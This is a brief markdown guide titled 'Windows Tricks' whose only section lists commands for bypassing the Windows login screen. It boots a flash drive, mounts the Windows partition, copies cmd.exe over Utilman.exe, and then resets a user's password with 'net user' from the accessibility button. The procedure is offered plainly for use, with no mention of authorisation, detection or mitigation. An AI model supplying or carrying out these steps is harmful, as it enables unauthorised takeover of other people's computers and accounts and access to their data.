# Windows Tricks
Guide on certain things Windows


_______________________________________________________________________________
# Cracking a windows password / bypassing the login screen

Boot Into Your Flash Drive And Type These Commands

`fdisk -l`

`mount -t ntfs /dev/(windows drive) /mnt`

`cd /mnt/Windows/System32`

`cp cmd.exe Utilman.exe`

reboot

Click On The Accesibility Button And Type This Command When The CMD Window Lauches

`net user (User) *` 
________________________________________________________________________________
